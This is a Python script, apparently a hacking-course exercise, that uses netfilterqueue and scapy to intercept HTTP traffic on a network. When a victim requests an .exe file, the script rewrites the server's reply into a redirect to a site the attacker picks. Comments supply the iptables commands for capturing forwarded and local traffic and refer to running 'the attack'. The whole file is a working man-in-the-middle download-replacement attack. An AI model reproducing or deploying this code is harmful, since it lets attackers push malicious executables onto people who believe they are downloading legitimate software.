import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())   
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load and "example.org" not in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/index.asp\n\n")                                
                packet.set_payload(bytes(modified_packet)) 

            
    
    packet.accept()

queue = netfilterqueue.NetfilterQueue() 
queue.bind(0, process_packet)
queue.run()



#  IPtables commands to redirect the DNS traffic to the queue (remote access):

#  sudo iptables -I FORWARD -j NFQUEUE --queue-num 0

#for internal testing . 

#sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
#sudo iptables -I INPUT -j NFQUEUE --queue-num 0


#After the attack is over dont forget to flush the ip tables 
#iptables --flush

#replace example.org with the website you want to redirect the user to.
